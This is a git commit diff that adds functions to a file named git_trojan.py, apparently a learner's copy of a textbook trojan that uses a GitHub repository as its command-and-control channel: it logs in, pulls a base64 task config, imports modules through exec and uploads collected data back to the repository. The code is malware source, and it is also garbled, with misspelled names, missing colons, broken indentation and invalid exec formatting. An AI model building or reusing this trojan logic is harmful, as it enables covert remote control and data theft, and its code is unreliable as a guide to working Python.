db40466c9ae7f5574a32b1bc5a5411614f98e9fc
marth172 <62154163+marth172@users.noreply.github.com>
2020-03-17 19:43:23 +0100

    Update git_trojan.py

--- git_trojan.py
+++ git_trojan.py
@@ -17,3 +17,34 @@ data_path = "data/%s/" % trojan_id
 trojan_models = []
 configured = false
 task_queue = Queue.Queue()
+def connect_to_github():
+ gh = login(username="marth172",password="********")
+ repo = gh.repository("marth172" , "chapter7")
+ branch= repo.branch("master")
+ 
+  return gh,repo,branch
+def get_file_contents(filepath):
+  gh,repo,brach = connect_to_github()
+  tree = branch.commit.commit.tree.recurse()
+  for filename in tree.tree
+   if filepath in filename.path:
+      print "[*] found file %s" % filepath
+       blob = repo.blob(filemane._json_data['sha'])
+       return  blob.content
+    return None
+def get_trojan_congfing()
+ global configured
+  confing_json = get_file_contents(trojan_config)
+  config = json.loads(base64.b64decode(config_json))
+  configured=true
+  for task in config:
+     if task ['module'] not in sys.modules:
+        exec("import &s" & task ['module'])
+        return config
+def store_module_result(data):
+  gh,repo,branch =<connect_to_gitub()
+  remote_path = "data/%s/%d.data" \
+    %(trojan_id,random.randint(1000,100000)
+      repo.create_file(remote_path,"Commit message",
+                       base64.b64enconde(data))
+      return
